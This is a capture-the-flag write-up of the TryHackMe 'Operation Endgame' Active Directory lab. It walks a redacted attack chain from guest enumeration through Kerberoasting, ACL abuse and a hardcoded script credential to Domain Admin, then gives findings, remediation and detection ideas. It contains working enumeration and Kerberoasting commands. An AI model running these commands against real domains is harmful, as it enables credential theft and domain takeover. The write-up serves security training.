---
title: "TryHackMe: Operation Endgame"
date: 2026-06-12 23:50:00 +0200
categories: [TryHackMe]
tags:
  - windows
  - active-directory
  - smb
  - ldap
  - kerberos
  - kerberoasting
  - targeted-kerberoasting
  - bloodhound
  - acl-abuse
  - credential-exposure
  - privilege-escalation
description: >-
  Operation Endgame chains guest-accessible Active Directory enumeration,
  Kerberoasting, password reuse, GenericWrite ACL abuse, targeted
  Kerberoasting, and hardcoded administrator credentials into full domain compromise.
author: lenovolegion7
media_subpath: /images/tryhackme_operation_endgame
image:
  path: room_image.webp
  alt: "Original TryHackMe Operation Endgame room artwork"
toc: true
comments: false
---

Operation Endgame is an Active Directory challenge built around weak guest enumeration, Kerberos service-account exposure, password reuse, excessive directory permissions, and insecure credential storage. The validated path progressed from guest-accessible SMB and LDAP enumeration to Domain Administrator-level access over the administrative `C$` share.

> Passwords, hashes, target addresses, and TryHackMe flags are redacted.
{: .prompt-warning }

[![TryHackMe Operation Endgame room card](room_card.webp){: w="299" h="269" .shadow }](https://tryhackme.com/room/operationendgame){: .center }

## Executive Summary

The target was an Active Directory domain controller exposing standard Windows domain services:

```text
53/tcp       DNS
80/443       HTTP/HTTPS
88/464       Kerberos
135/139/445  RPC / NetBIOS / SMB
389/636      LDAP / LDAPS
3268/3269    Global Catalog
3389         RDP
```

The validated compromise path was:

1. authenticate to SMB with Guest/null-equivalent access;
2. enumerate SMB and LDAP to build a domain user list;
3. Kerberoast the SPN-bearing account `CODY_ROY`;
4. crack the recovered Kerberos TGS offline;
5. validate the recovered `CODY_ROY` credential over SMB and RDP;
6. identify password reuse by `ZACHARY_HUNT`;
7. discover that `ZACHARY_HUNT` had `GenericWrite` over `JERRI_LANCASTER`;
8. use that directory right to enable targeted Kerberoasting of `JERRI_LANCASTER`;
9. crack the targeted Kerberos material offline;
10. obtain RDP access as `JERRI_LANCASTER`;
11. access the restricted `C:\Scripts` directory;
12. recover a hardcoded credential from `syncer.ps1`;
13. validate the exposed `SANFORD_DAUGHERTY` credential;
14. obtain Domain Administrator-level access with READ/WRITE to administrative shares;
15. retrieve the final Administrator objective from the `C$` share.

> **Result:** Guest-level domain visibility was converted into complete Domain Administrator compromise through Kerberoasting, password reuse, ACL abuse, and hardcoded privileged credentials.
{: .prompt-danger }

## Scope and Safety Context

This assessment was performed only against the authorized TryHackMe Operation Endgame laboratory environment.

Testing was limited to the assigned Active Directory target and challenge objective. Destructive actions, persistence beyond the challenge, and activity outside the lab were excluded.

## Initial Enumeration

The domain and primary domain controller were:

```text
Domain: thm.local
DC:     ad.thm.local
```

Representative discovery:

```console
$ nmap \
  -p53,80,88,135,139,389,443,445,464,636,3389,3268,3269 \
  -sV -sC -Pn \
  TARGET_IP
```

SMB signing was required, while Guest/null-equivalent access still exposed useful directory and share information.

## Guest SMB and LDAP Enumeration

Guest authentication succeeded against SMB:

```console
$ nxc smb TARGET_IP \
  -u guest \
  -p '' \
  --shares
```

The environment exposed standard domain shares and enough LDAP data to enumerate valid domain principals.

This provided the user list needed for subsequent Kerberos testing without a normal user credential.

## Kerberoasting CODY_ROY

Guest-domain context allowed Kerberoasting of the service account:

```text
CODY_ROY
```

The account had the SPN:

```text
HTTP/server.secure.com
```

Representative workflow:

```console
$ nxc ldap ad.thm.local \
  -u guest \
  -p '' \
  --kerberoasting kerberoasting.txt
```

The recovered TGS was cracked offline. The plaintext password is intentionally not published:

```text
CODY_ROY : [REDACTED]
```

The credential authenticated successfully to domain services, including RDP.

## Password Reuse and ZACHARY_HUNT Access

The recovered service-account password was reused by:

```text
ZACHARY_HUNT
```

The reused value is redacted:

```text
ZACHARY_HUNT : [REDACTED]
```

This expanded the authenticated foothold to a principal with a useful Active Directory object-control permission.

## GenericWrite ACL Abuse

BloodHound-style relationship analysis identified:

```text
ZACHARY_HUNT
    |
    | GenericWrite
    v
JERRI_LANCASTER
```

`GenericWrite` over the user object allowed manipulation sufficient to enable a targeted Kerberoasting path against `JERRI_LANCASTER`.

The resulting Kerberos service ticket was recovered and attacked offline.

## Targeted Kerberoasting JERRI_LANCASTER

Representative targeted Kerberoasting workflow:

```console
$ python3 targetedKerberoast.py \
  -d thm.local \
  -u ZACHARY_HUNT \
  -p '[REDACTED]' \
  --request-user JERRI_LANCASTER \
  --dc-ip TARGET_IP
```

Offline cracking recovered the `JERRI_LANCASTER` password. It is intentionally redacted:

```text
JERRI_LANCASTER : [REDACTED]
```

The credential provided interactive RDP access.

## Restricted Script Credential Disclosure

From the `JERRI_LANCASTER` context, the restricted scripts directory became accessible:

```text
C:\Scripts
```

The file:

```text
C:\Scripts\syncer.ps1
```

contained a hardcoded credential for:

```text
SANFORD_DAUGHERTY
```

The plaintext password is not published:

```text
SANFORD_DAUGHERTY : [REDACTED]
```

This credential represented the final privilege boundary in the validated chain.

## Domain Administrator Access

The exposed `SANFORD_DAUGHERTY` credential authenticated successfully and provided Domain Administrator-level access.

Administrative SMB access included:

```text
ADMIN$  READ,WRITE
C$      READ,WRITE
```

The final objective was retrieved from:

```text
C:\Users\Administrator\Desktop\flag.txt.txt
```

Its value is published only as:

```text
THM{[REDACTED]}
```

## Findings

### F-01 - Guest/Anonymous Domain Enumeration Enabled

- **Severity:** High
- **Affected services:** SMB and LDAP
- **Impact:** domain-user discovery and Kerberos attack-surface enumeration

Guest access exposed enough information to identify domain users and begin offline Kerberos credential attacks.

**Remediation:**

- disable Guest authentication;
- restrict anonymous LDAP and SMB enumeration;
- limit unnecessary share and IPC exposure;
- monitor Guest logons and bulk enumeration behavior.

### F-02 - Kerberoastable Service Account with Crackable Password

- **Severity:** Critical
- **Affected account:** `CODY_ROY`
- **SPN:** `HTTP/server.secure.com`
- **Impact:** authenticated domain access

A Kerberos service ticket for the SPN-bearing account was crackable offline.

**Remediation:**

- use long, random service-account passwords;
- migrate suitable service accounts to gMSAs;
- rotate affected credentials immediately;
- inventory and review SPN-bearing accounts;
- monitor unusual TGS request volume.

### F-03 - Password Reuse Across Domain Accounts

- **Severity:** High
- **Affected accounts:** `CODY_ROY`, `ZACHARY_HUNT`
- **Impact:** lateral movement to a principal with dangerous ACL rights

The password recovered from `CODY_ROY` was reused by `ZACHARY_HUNT`.

**Remediation:**

- enforce unique credentials per account;
- deploy password-reuse auditing;
- rotate all affected passwords;
- use managed secrets for service and administrative identities.

### F-04 - Excessive Active Directory ACL Rights

- **Severity:** Critical
- **Affected relationship:** `ZACHARY_HUNT → JERRI_LANCASTER`
- **Right:** `GenericWrite`
- **Impact:** targeted Kerberoasting and further lateral movement

The excessive object permission allowed the attacker to manipulate `JERRI_LANCASTER` sufficiently to recover crackable Kerberos material.

**Remediation:**

- remove unnecessary `GenericWrite`, `GenericAll`, `WriteDACL`, and `WriteOwner` permissions;
- regularly audit AD ACLs;
- use tiered administration;
- monitor sensitive object-control changes.

### F-05 - JERRI_LANCASTER Password Crackable via Targeted Kerberoasting

- **Severity:** High
- **Affected account:** `JERRI_LANCASTER`
- **Impact:** RDP access and restricted script access

Weak password selection allowed the targeted Kerberos material to be cracked offline.

**Remediation:**

- enforce long, high-entropy passwords;
- block weak and common passwords;
- rotate the exposed credential;
- monitor targeted SPN changes and TGS requests.

### F-06 - Hardcoded Domain Administrator Credentials in Script

- **Severity:** Critical
- **Affected file:** `C:\Scripts\syncer.ps1`
- **Affected account:** `SANFORD_DAUGHERTY`
- **Impact:** direct Domain Administrator compromise

A restricted PowerShell script stored a reusable privileged credential in plaintext.

**Remediation:**

- remove plaintext credentials from scripts;
- rotate the exposed administrator credential immediately;
- use gMSAs or managed secret storage;
- restrict access to sensitive scripts;
- deploy secret scanning for PowerShell and automation content.

### F-07 - Broad RDP Exposure to Compromised Accounts

- **Severity:** High
- **Impact:** simplified interactive lateral movement

Multiple compromised accounts were permitted to authenticate interactively over RDP.

**Remediation:**

- restrict RDP to hardened jump hosts and approved administrative principals;
- require MFA where possible;
- use privileged-access workstations and just-in-time access;
- monitor lateral RDP sessions.

### F-08 - World-Writable Data Directory

- **Severity:** Medium
- **Affected path:** `C:\Data`
- **Impact:** potential tampering with files consumed by other processes

The directory allowed broad write access. It was not required for the successful compromise path, but represented an additional trust-boundary weakness.

**Remediation:**

- restrict write access to explicitly required principals;
- remove Guest and Everyone full-control permissions;
- monitor privileged processes that consume user-writable content.

## Security Impact

The validated chain resulted in complete administrative compromise of the Active Directory domain controller.

An attacker with equivalent access could:

- enumerate domain identities through Guest-accessible services;
- recover crackable Kerberos material;
- obtain valid domain credentials;
- exploit password reuse;
- abuse excessive AD object permissions;
- recover additional credentials through targeted Kerberoasting;
- read restricted automation scripts;
- recover a hardcoded Domain Administrator credential;
- access `ADMIN$` and `C$` with READ/WRITE permissions;
- retrieve or modify privileged data on the domain controller.

The compromise depended on several connected identity and trust failures rather than one software vulnerability.

## Detection Opportunities

Useful monitoring controls include:

- alert on Guest SMB and anonymous LDAP enumeration;
- monitor Kerberoasting and abnormal TGS request volume;
- detect password reuse across service and user identities;
- alert on changes enabled by `GenericWrite` over user objects;
- monitor targeted SPN manipulation and Kerberos service-ticket requests;
- detect RDP sessions by newly compromised users;
- scan scripts for credential-like literals;
- alert on reads of sensitive automation scripts;
- monitor administrative share access following lateral movement;
- alert on unusual `C$` and `ADMIN$` READ/WRITE activity.

## Remediation Priorities

1. Disable Guest authentication and reduce anonymous SMB/LDAP exposure.
2. Rotate credentials for `CODY_ROY`, `ZACHARY_HUNT`, `JERRI_LANCASTER`, and `SANFORD_DAUGHERTY`.
3. Move SPN-bearing identities to strong random credentials or gMSAs.
4. Remove unnecessary `GenericWrite` and related object-control permissions.
5. Remove plaintext credentials from `C:\Scripts\syncer.ps1`.
6. Restrict RDP to hardened administrative workflows.
7. Harden filesystem permissions on `C:\Scripts` and `C:\Data`.
8. Deploy Kerberoasting, targeted-SPN, RDP, and administrative-share monitoring.
9. Run recurring BloodHound/ACL reviews.

## Retest Plan

1. Confirm Guest authentication no longer exposes useful SMB or LDAP information.
2. Verify `CODY_ROY` Kerberos material is no longer practically crackable.
3. Confirm the previous recovered credential does not authenticate to `ZACHARY_HUNT`.
4. Verify `ZACHARY_HUNT` no longer has dangerous control over `JERRI_LANCASTER`.
5. Confirm targeted Kerberoasting of `JERRI_LANCASTER` through the previous ACL path fails.
6. Verify `JERRI_LANCASTER` uses a rotated high-entropy credential.
7. Confirm `C:\Scripts\syncer.ps1` contains no reusable credentials.
8. Verify the previous `SANFORD_DAUGHERTY` credential no longer authenticates.
9. Confirm compromised non-admin accounts cannot use unrestricted RDP.
10. Verify the previous chain no longer yields administrative `C$` access.

## Lessons Learned

Operation Endgame demonstrates how a mature-looking Active Directory environment can still fail through chained identity and authorization weaknesses.

Guest enumeration exposed the domain, Kerberoasting supplied the first reusable credential, password reuse moved the attacker into a more useful identity, excessive `GenericWrite` permissions enabled targeted Kerberoasting, and a restricted script ultimately disclosed a Domain Administrator credential.

The strongest defensive response is to treat Guest access, service-account passwords, password reuse, directory ACLs, RDP exposure, and automation secrets as one connected Active Directory security boundary.
